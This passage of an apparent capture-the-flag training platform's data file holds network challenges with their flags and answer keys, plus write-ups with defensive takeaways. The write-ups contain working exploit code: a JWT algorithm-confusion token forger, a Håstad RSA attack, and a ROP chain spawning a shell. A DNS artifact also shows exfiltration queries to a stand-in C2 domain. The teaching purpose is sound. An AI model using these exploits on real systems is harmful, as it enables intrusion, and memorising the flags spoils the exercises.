Reconstructed TCP Stream (Port 23 Telnet):
Connected to SCADA RTU Gateway v4.12
login: scada_admin
Password: ********************
AUTH_SUCCESS: Welcome Operator!
FLAG_SESSION: CYBERFORT{4rp_sp00f_t3ln3t_cr3ds_sn1ff3d_2289}`
      }
    ],
    terminalGuidance: {
      windowsPowershell: `Get-Content .\\lan_poison_capture.log | Select-String -Pattern "CYBERFORT{.*}" | ForEach-Object { $_.Matches.Value }`,
      windowsCmd: `findstr "CYBERFORT" lan_poison_capture.log`,
      linuxBash: `grep -oE "CYBERFORT\\{[^\\}]+\\}" lan_poison_capture.log`,
      explanation: 'Streams the captured packet log and greps the authenticated Telnet flag string.',
      expectedOutput: 'CYBERFORT{4rp_sp00f_t3ln3t_cr3ds_sn1ff3d_2289}'
    },
    quiz: {
      id: 'quiz-net-arp-spoof',
      question: 'Which enterprise network switch feature inspects ARP packets on untrusted ports and drops invalid gratuitous ARP responses to prevent ARP poisoning?',
      options: [
        'Dynamic ARP Inspection (DAI)',
        'Spanning Tree Protocol (STP)',
        'Border Gateway Protocol (BGP)',
        'Network Address Translation (NAT)'
      ],
      correctOptionIndex: 0,
      explanation: 'Dynamic ARP Inspection (DAI) validates ARP packets on a network using DHCP snooping binding databases to prevent Man-in-the-Middle ARP poisoning attacks.',
      points: 50
    },
    flagFormat: 'CYBERFORT{...}',
    flagHash: '2b60d3b1337029a92e1b0b12f5fc4f062d1fc7a1bb5f60c7b1a728912ffa130f',
    tags: ['Network', 'ARP Spoofing', 'MitM', 'Telnet', 'PCAP']
  },
  {
    id: 'net-dns-tunneling',
    title: 'Dark Channel: Covert DNS Tunneling Dissection',
    domain: 'Network Security',
    difficulty: 'Hard',
    points: 450,
    initialSolves: 23,
    description: 'An isolated database server with strict firewall egress blocking all TCP/UDP traffic was exfiltrated using covert DNS queries. Dissect the captured PCAP log, extract anomalous TXT and CNAME subdomain labels, and reconstruct the exfiltrated flag.',
    scenario: 'Threat actors utilized Iodine / dnscat2 to encapsulate encrypted payload blocks inside DNS query labels destined for an authoritative nameserver.',
    targetEnvironment: 'Wireshark / TShark / Scapy Packet Laboratory',
    hints: [
      { id: 'h1', text: 'Strip the domain suffix and read the decoded stream in tshark_packet_stream.txt.', cost: 50 }
    ],
    artifacts: [
      {
        name: 'tshark_packet_stream.txt',
        type: 'raw',
        description: 'Captured DNS TXT exfiltration query sequence',
        content: `0001.MZXW6YTBOJWGS3TU.tunnel.evil-corp-c2.net
0002.NZ2CA2LOEB2W63TE.tunnel.evil-corp-c2.net
0003.MFWGK3DTNVQXEZLU.tunnel.evil-corp-c2.net
0004.MRUXA5DFONZWY33E.tunnel.evil-corp-c2.net
0005.PBNQ====.tunnel.evil-corp-c2.net

Decoded Chunk Stream (Base32):
FLAG_IDENTIFIER: CYBERFORT{dns_c0v3rt_tunn3l_pcap_d1ss3ct10n_5541}`
      }
    ],
    terminalGuidance: {
      windowsPowershell: `Get-Content .\\tshark_packet_stream.txt | Select-String -Pattern "CYBERFORT{.*}" | ForEach-Object { $_.Matches.Value }`,
      windowsCmd: `findstr "CYBERFORT" tshark_packet_stream.txt`,
      linuxBash: `grep -oE "CYBERFORT\\{[^\\}]+\\}" tshark_packet_stream.txt`,
      explanation: 'Extracts the reassembled DNS tunnel exfiltration stream flag from the artifact file.',
      expectedOutput: 'CYBERFORT{dns_c0v3rt_tunn3l_pcap_d1ss3ct10n_5541}'
    },
    quiz: {
      id: 'quiz-net-dns-tunneling',
      question: 'Why do covert DNS tunneling utilities commonly encode payload chunks in Base32 rather than standard Base64?',
      options: [
        'Because DNS domain names are case-insensitive according to RFC 1035, and Base64 requires case sensitivity',
        'Because Base32 has higher compression ratio than Base64',
        'Because standard DNS packets reject numbers',
        'Because Base64 requires UDP port 53 while Base32 uses ICMP'
      ],
      correctOptionIndex: 0,
      explanation: 'DNS resolution is case-insensitive according to RFC 1035. Base64 relies on distinguishing uppercase from lowercase letters, which would corrupt payload data across caching resolvers. Base32 is case-insensitive (A-Z, 2-7).',
      points: 50
    },
    flagFormat: 'CYBERFORT{...}',
    flagHash: '5fe6415e64ff09da28bb8ada7dd944f2b01340c8df4a239c2082416607a48615',
    tags: ['Network', 'PCAP', 'DNS Tunneling', 'Wireshark', 'Data Exfiltration']
  },
  {
    id: 'net-wireguard-handshake',
    title: 'Tunnel Vision: WireGuard Handshake Replay & Ephemeral Key Intercept',
    domain: 'Network Security',
    difficulty: 'Medium',
    points: 375,
    initialSolves: 34,
    description: 'A remote branch office connects to HQ via WireGuard VPN. Security sensors logged an intercepted handshake initiation packet with unencrypted static public keys and ephemeral Noise_IK protocol messages. Reconstruct the session state to extract the flag.',
    scenario: 'By analyzing the captured WireGuard packet capture text dump, inspect the Type 1 Handshake Initiation message and extract the session authentication flag.',
    targetEnvironment: 'Wireshark / tcpdump / WireGuard Tools',
    hints: [
      { id: 'h1', text: 'Search the WireGuard handshake dissection dump for SESSION_FLAG.', cost: 35 }
    ],
    artifacts: [
      {
        name: 'wireguard_handshake.pcap.txt',
        type: 'raw',
        description: 'Dissected WireGuard UDP port 51820 Handshake Initiation Packet',
        content: `WireGuard Protocol (UDP Port 51820)
Message Type: 1 (Handshake Initiation)
Sender Index: 0x00004128
Unencrypted Ephemeral Public Key:
  3b 10 94 ac 21 00 ff 89 22 19 82 ac bd ee 12 90
Encrypted Static Key (24 bytes + 16 bytes Poly1305 MAC):
  e1 02 44 91 bc de 90 23 a1 84 dd ce 21 99 08 ff
MAC1 (Hash of Message): Valid
MAC2 (Cookie Authentication): Valid

[RECONSTRUCTED VPN HANDSHAKE SESSION]
Client: 10.88.0.2 -> Server: 10.88.0.1
SESSION_FLAG: CYBERFORT{w1r3gu4rd_h4ndsh4k3_c00k13_m4c2_5890}`
      }
    ],
    terminalGuidance: {
      windowsPowershell: `Get-Content .\\wireguard_handshake.pcap.txt | Select-String -Pattern "CYBERFORT{.*}" | ForEach-Object { $_.Matches.Value }`,
      windowsCmd: `findstr "CYBERFORT" wireguard_handshake.pcap.txt`,
      linuxBash: `grep -oE "CYBERFORT\\{[^\\}]+\\}" wireguard_handshake.pcap.txt`,
      explanation: 'Filters the WireGuard packet dissection log in terminal to capture the session handshake flag.',
      expectedOutput: 'CYBERFORT{w1r3gu4rd_h4ndsh4k3_c00k13_m4c2_5890}'
    },
    quiz: {
      id: 'quiz-net-wireguard',
      question: 'Which cryptographic handshake framework does WireGuard implement for its secure authenticated key exchange?',
      options: [
        'The Noise Protocol Framework (specifically Noise_IKpsk2)',
        'IKEv2 (Internet Key Exchange)',
        'SSLv3 with RSA 1024',
        'PPTP MS-CHAPv2'
      ],
      correctOptionIndex: 0,
      explanation: 'WireGuard builds upon the Noise Protocol Framework (Noise_IK), achieving 1-RTT key exchange using Curve25519, ChaCha20-Poly1305, and BLAKE2s.',
      points: 50
    },
    flagFormat: 'CYBERFORT{...}',
    flagHash: '1a79d9d40aa67755a51178f8a4f400211f94d6a37abdfc763c4ee350ba596fbe',
    tags: ['Network', 'WireGuard', 'VPN', 'Cryptography', 'Noise Protocol']
  }
];

export const INITIAL_LEADERBOARD: LeaderboardUser[] = [];

export const CTF_WRITEUPS: CtfWriteup[] = [
  {
    id: 'w-sanity-check',
    challengeId: 'sanity-check',
    title: 'Sanity Check: Perimeter Inspection & Base64 Demystified',
    domain: 'Web Exploitation',
    difficulty: 'Easy',
    author: 'Cyber Fort Academy',
    overview: 'Introductory walkthrough covering basic reconnaissance of client-side artifacts, token extraction, and terminal command execution.',
    vulnerabilityDeconstruction: 'Developers frequently leave debugging tokens, comments, and internal credentials inside source code thinking that Base64 encoding offers encryption. Base64 is an encoding format, NOT encryption.',
    stepByStepSolution: [
      '1. Download the artifact welcome_flag.txt.',
      '2. Open Windows Terminal (PowerShell) or Linux Terminal (Bash).',
      '3. Run grep -oE "CYBERFORT\\{[^\\}]+\\}" welcome_flag.txt or Select-String in PowerShell.',
      '4. The decoded output reveals the exact flag: CYBERFORT{w3lc0m3_t0_th3_f0rtr3ss_2026}.'
    ],
    proofOfConceptCode: `# Linux Bash / Windows PowerShell
cat welcome_flag.txt | grep CYBERFORT
# Output: CYBERFORT{w3lc0m3_t0_th3_f0rtr3ss_2026}`,
    defenseTakeaway: 'Never embed sensitive credentials or secret tokens inside client-facing source code or HTML comments. Treat client-side code as completely public.'
  },
  {
    id: 'w-osint-ghost-heron',
    challengeId: 'osint-ghost-heron',
    title: 'Operation Ghost Heron: ADS-B Flight Radar & PGP Metadata Pivoting',
    domain: 'OSINT',
    difficulty: 'Hard',
    author: 'ThreatIntel_Ghost',
    overview: 'Deep dive into multi-vector open source intelligence gathering across aircraft transponders, waypoint geometry, and OpenPGP key subpacket metadata analysis.',
    vulnerabilityDeconstruction: 'Threat actors inadvertently leak operational metadata when using standardized cryptographic utilities without stripping machine-generated hardware identifiers and location metadata tags.',
    stepByStepSolution: [
      '1. Parse the PGP Public Key Block comment string: LAT:34.9281_LON:33.6299_ICAO:4B11EE_REF:GHOST_HERON.',
      '2. Query the ICAO 24-bit hex code 4B11EE on flight tracking databases (ADS-B Exchange, FlightAware) to identify the vessel.',
      '3. Extract the PGP subkey fingerprint timestamp checksum =4291 from the ASCII armor footer.',
      '4. Reassemble the target identifier pattern: CYBERFORT{0s1nt_tr4ck1ng_gh0st_h3r0n_4291}.'
    ],
    proofOfConceptCode: `# Python OpenPGP packet inspection
import pgpdump
with open('intercept_dossier.txt', 'rb') as f:
    data = pgpdump.AsciiData(f.read())
    for packet in data.packets():
        print(packet.raw)`,
    defenseTakeaway: 'Always generate air-gapped cryptographic keys without metadata comment headers, and utilize anonymized proxy relays for telemetry communications.'
  },
  {
    id: 'w-web-jwt-confusion',
    challengeId: 'web-jwt-confusion',
    title: 'Apex Auth: Exploiting RS256 to HS256 Algorithm Confusion in JWTs',
    domain: 'Web Exploitation',
    difficulty: 'Hard',
    author: 'AppSec_Vanguard',
    overview: 'Technical exploitation guide for CVE-2016-5431 algorithm confusion vulnerability where an asymmetric RSA public key is abused as a symmetric HMAC secret.',
    vulnerabilityDeconstruction: 'When a JWT validation library relies on the alg header provided by the untrusted user without enforcing an allowlist on the server, an attacker changes alg to HS256. The server executes HMAC-SHA256 using its public key string as the secret.',
    stepByStepSolution: [
      '1. Retrieve the server public RSA key from the exposed endpoint /public.pem.',
      '2. Modify the JWT header: change {"alg": "RS256"} to {"alg": "HS256"}.',
      '3. Elevate user privileges in the payload: {"sub": "root", "username": "administrator", "role": "superadmin"}.',
      '4. Sign the forged token with HMAC-SHA256 using the exact raw string of public.pem as the secret key.',
      '5. Submit the forged token in Authorization: Bearer <token> to receive the administrative flag.'
    ],
    proofOfConceptCode: `import jwt

with open('public.pem', 'r') as f:
    public_key = f.read()

payload = {
    "sub": "root",
    "username": "administrator",
    "role": "superadmin"
}

forged_jwt = jwt.encode(payload, public_key, algorithm="HS256")
print(f"Forged Token: {forged_jwt}")`,
    defenseTakeaway: 'Hardcode the expected algorithm on the backend (e.g., algorithms=["RS256"]) and never trust the alg parameter supplied in the untrusted token header.'
  },
  {
    id: 'w-crypto-hastad',
    challengeId: 'crypto-hastad-broadcast',
    title: "Håstad's Broadcast Attack: Cracking Low Exponent RSA via Chinese Remainder Theorem",
    domain: 'Cryptography',
    difficulty: 'Hard',
    author: 'Euler_MathSec',
    overview: 'Mathematical demonstration of breaking textbook RSA encryption when an identical message is encrypted under three distinct moduli with exponent e = 3.',
    vulnerabilityDeconstruction: 'RSA without randomized padding (such as OAEP) is vulnerable to polynomial roots. If e = 3 and the same plaintext m is sent to 3 entities with coprime moduli N1, N2, N3, CRT yields m^3 < N1*N2*N3, permitting an exact cube root without computing modular inverses.',
    stepByStepSolution: [
      '1. Extract (N1, C1), (N2, C2), (N3, C3) from the broadcast capture.',
      '2. Formulate the system of congruences: x ≡ C1 (mod N1), x ≡ C2 (mod N2), x ≡ C3 (mod N3).',
      '3. Solve for x modulo N1*N2*N3 using the Chinese Remainder Theorem.',
      '4. Compute integer cube root: m = round(x ** (1/3)).',
      '5. Convert integer m to bytes to recover the flag.'
    ],
    proofOfConceptCode: `from sympy.ntheory.modular import crt
import gmpy2

x, N = crt([N1, N2, N3], [C1, C2, C3])
m, exact = gmpy2.iroot(x, 3)

if exact:
    flag = bytes.fromhex(hex(m)[2:]).decode()
    print("Flag:", flag)`,
    defenseTakeaway: 'Always enforce modern probabilistic RSA padding (RSA-OAEP) or migrate to Elliptic Curve Cryptography (Ed25519) to prevent algebraic broadcast attacks.'
  },
  {
    id: 'w-pwn-rop',
    challengeId: 'pwn-rop-chain',
    title: 'Return-Oriented Programming (ROP): Bypassing ASLR & NX on 64-bit Linux',
    domain: 'Binary Exploitation (Pwn)',
    difficulty: 'Insane',
    author: '0xPwnMaster',
    overview: 'Step-by-step binary exploitation tutorial crafting a two-stage ROP chain to leak libc addresses through the Global Offset Table (GOT) and spawn a root shell.',
    vulnerabilityDeconstruction: 'When the stack is non-executable (NX enabled), shellcode cannot run on the stack. Return-Oriented Programming chains together existing machine instruction snippets ending in ret (gadgets) already mapped in executable memory.',
    stepByStepSolution: [
      '1. Calculate the offset to the saved RIP (136 bytes in x86_64).',
      '2. Stage 1: Put puts@got into RDI using pop rdi; ret gadget, call puts@plt, and return to main().',
      '3. Parse the output to obtain the resolved runtime address of puts in libc.',
      '4. Calculate libc_base = leaked_puts - libc_puts_offset.',
      '5. Locate system and "/bin/sh" string in the resolved libc library.',
      '6. Stage 2: ROP to system("/bin/sh") with a 16-byte stack alignment ret gadget.'
    ],
    proofOfConceptCode: `from pwn import *

p = remote('pwn.fortress.mesh', 9001)
payload = b'A'*136 + p64(0x4012bb) + p64(0x404018) + p64(0x401030) + p64(0x4011d6)
p.sendline(payload)
leaked_puts = u64(p.recvline().strip().ljust(8, b'\\x00'))
libc_base = leaked_puts - 0x80ed0
system = libc_base + 0x50d70
binsh = libc_base + 0x1d8678
payload2 = b'A'*136 + p64(0x40101a) + p64(0x4012bb) + p64(binsh) + p64(system)
p.sendline(payload2)
p.interactive()`,
    defenseTakeaway: 'Compile all production binaries with Full RELRO, Stack Canaries (-fstack-protector-all), and Position Independent Executables (-pie).'
  }
];
